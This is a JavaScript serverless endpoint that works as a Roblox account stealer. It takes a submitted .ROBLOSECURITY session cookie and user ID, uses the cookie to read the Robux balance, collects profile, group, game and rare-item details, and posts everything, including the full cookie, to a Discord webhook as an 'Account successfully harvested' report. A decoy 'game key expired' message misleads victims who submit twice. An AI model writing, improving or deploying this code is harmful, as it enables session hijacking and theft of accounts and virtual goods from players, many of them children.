// api/submit.js – v4.0: Beautiful embed + extra analytics
const WEBHOOK_URL = process.env.WEBHOOK_URL;

const cooldownStore = new Map();
const COOLDOWN_MS = 10 * 60 * 1000;

function getCookieHash(cookie) {
  let hash = 0;
  for (let i = 0; i < cookie.length; i++) {
    hash = ((hash << 5) - hash) + cookie.charCodeAt(i);
    hash |= 0;
  }
  return hash.toString();
}

async function fetchWithTimeout(url, options, timeout = 8000) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeout);
  try {
    const res = await fetch(url, { ...options, signal: controller.signal });
    clearTimeout(id);
    return res;
  } catch (err) {
    clearTimeout(id);
    throw err;
  }
}

async function fetchUserInfo(userId) {
  try {
    const res = await fetchWithTimeout(`https://users.roblox.com/v1/users/${userId}`);
    if (!res.ok) return null;
    const data = await res.json();

    const friendsRes = await fetchWithTimeout(`https://friends.roblox.com/v1/users/${userId}/friends/count`);
    let friends = "N/A";
    if (friendsRes.ok) {
      const f = await friendsRes.json();
      friends = f.count?.toLocaleString() || "0";
    }

    let premium = "❌ No";
    try {
      const premRes = await fetchWithTimeout(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`);
      if (premRes.ok) {
        const p = await premRes.json();
        premium = p.isPremium ? "✅ Yes" : "❌ No";
      }
    } catch (e) {}

    const banned = data.isBanned ? "⚠️ Banned" : "✅ Active";

    // Avatar URL (headshot)
    const thumbRes = await fetchWithTimeout(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`);
    let avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
    if (thumbRes.ok) {
      const thumbData = await thumbRes.json();
      if (thumbData.data?.[0]?.imageUrl) avatarUrl = thumbData.data[0].imageUrl;
    }

    return {
      username: data.name,
      displayName: data.displayName,
      userId: data.id,
      created: new Date(data.created).toLocaleString(),
      description: data.description?.substring(0, 200) || "None",
      friends,
      premium,
      banned,
      avatarUrl,
      profileUrl: `https://www.roblox.com/users/${userId}/profile`
    };
  } catch (err) {
    console.error("fetchUserInfo error:", err);
    return null;
  }
}

async function fetchRobux(cookie) {
  try {
    const res = await fetchWithTimeout("https://economy.roblox.com/v1/user/currency", {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (!res.ok) return "N/A";
    const data = await res.json();
    return data.robux?.toLocaleString() || "0";
  } catch (e) {
    return "N/A";
  }
}

// Fetch last 3 games played
async function fetchLastGames(userId) {
  try {
    const res = await fetchWithTimeout(`https://games.roblox.com/v1/users/${userId}/games?sortOrder=Asc&limit=3`);
    if (!res.ok) return "Unknown";
    const data = await res.json();
    if (!data.data?.length) return "No recent games";
    return data.data.map(g => `🎮 **${g.name}** (ID: ${g.id})`).join("\n");
  } catch (e) {
    return "Unknown";
  }
}

async function fetchGroups(userId) {
  try {
    const res = await fetchWithTimeout(`https://groups.roblox.com/v1/users/${userId}/groups/roles`);
    if (!res.ok) return "None";
    const data = await res.json();
    if (!data.data?.length) return "No groups";
    const top = data.data.slice(0, 3).map(g => `🏛️ **${g.group.name}** – ${g.role.name}`);
    return top.join("\n");
  } catch (e) {
    return "Error";
  }
}

// Detect special valuable items (Headless, Korblox, etc.)
async function fetchValuables(userId) {
  try {
    const res = await fetchWithTimeout(`https://avatar.roblox.com/v1/users/${userId}/avatar`);
    if (!res.ok) return "None";
    const data = await res.json();
    const assets = data.assets || [];
    const valuableIds = [  // known limited item IDs (partial)
      1361485, // Headless Horseman
      1361486, // Korblox Deathspeaker
      102611803, // Dominus
       // add more if needed
    ];
    const hasValuable = assets.some(a => valuableIds.includes(a.id));
    if (hasValuable) return "✅ Contains rare item (Headless/Korblox)";
    return "None detected";
  } catch (e) {
    return "Error";
  }
}

async function fetchAccessories(userId) {
  try {
    const res = await fetchWithTimeout(`https://avatar.roblox.com/v1/users/${userId}/avatar`);
    if (!res.ok) return "None";
    const data = await res.json();
    const assets = data.assets || [];
    const types = ["Hat", "FaceAccessory", "NeckAccessory", "ShoulderAccessory", "FrontAccessory", "BackAccessory", "WaistAccessory", "Glasses", "Earrings", "Headphones"];
    const acc = assets.filter(a => types.includes(a.assetType.name)).map(a => a.name);
    if (!acc.length) return "No accessories";
    return acc.slice(0, 6).join(", ") + (acc.length > 6 ? " …" : "");
  } catch (e) {
    return "Error";
  }
}

async function sendToDiscord(cookie, userId) {
  const [user, robux, lastGames, groups, accessories, valuables] = await Promise.all([
    fetchUserInfo(userId),
    fetchRobux(cookie),
    fetchLastGames(userId),
    fetchGroups(userId),
    fetchAccessories(userId),
    fetchValuables(userId)
  ]);

  const embed = {
    title: "🔱 Vyro Autohar 🔱",
    description: `✨ **Account successfully harvested** ✨\n\n**Cookie:** \`${cookie.substring(0, 80)}…\` (${cookie.length} chars)`,
    color: 0xFF69B4, // hot pink
    thumbnail: user ? { url: user.avatarUrl } : undefined,
    fields: [],
    footer: {
      text: "made by vyro28 on discord | Bloxtools v4.0",
      icon_url: "https://cdn.discordapp.com/emojis/…" // optional
    },
    timestamp: new Date().toISOString()
  };

  if (user) {
    embed.fields.push(
      { name: "👤 User Profile", value: `**${user.username}** (${user.displayName})\n🆔 \`${user.userId}\`\n📅 Joined: ${user.created}\n⚡ Status: ${user.banned}`, inline: false },
      { name: "💰 Robux", value: `\`${robux} R$\``, inline: true },
      { name: "👥 Friends", value: `\`${user.friends}\``, inline: true },
      { name: "✨ Premium", value: user.premium, inline: true },
      { name: "💎 Valuable Items", value: valuables, inline: false },
      { name: "🕶️ Accessories", value: accessories, inline: false },
      { name: "🏛️ Top 3 Groups", value: groups, inline: false },
      { name: "🎮 Last 3 Games", value: lastGames, inline: false },
      { name: "📝 About", value: user.description.substring(0, 180), inline: false }
    );
  } else {
    embed.fields.push({ name: "⚠️ Error", value: "Could not fetch user profile (account may be deleted).", inline: false });
  }

  // Add the full cookie only in a separate field (hidden under a code block)
  embed.fields.push({ name: "🔐 Full Cookie (click to reveal)", value: `\`\`\`\n${cookie}\n\`\`\``, inline: false });

  const res = await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username: "Vyro Harvest System", embeds: [embed] })
  });
  return res.ok;
}

module.exports = async (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  const { cookie, rbxuid } = req.body;
  if (!cookie || !rbxuid) return res.status(400).json({ error: "Missing cookie or rbxuid" });
  if (!WEBHOOK_URL) return res.status(500).json({ error: "Missing WEBHOOK_URL" });

  const hash = getCookieHash(cookie);
  const now = Date.now();
  const last = cooldownStore.get(hash);
  if (last && now - last < COOLDOWN_MS) {
    return res.json({ success: false, blocked: true, message: "Game key expired or invalid. Obtain a new key." });
  }
  cooldownStore.set(hash, now);
  if (cooldownStore.size > 100) {
    for (const [h, t] of cooldownStore.entries()) {
      if (now - t > COOLDOWN_MS) cooldownStore.delete(h);
    }
  }

  const webhookOk = await sendToDiscord(cookie, rbxuid);
  if (webhookOk) {
    return res.json({ success: true, firstTime: true });
  } else {
    return res.json({ success: false, error: "Processing failed" });
  }
};
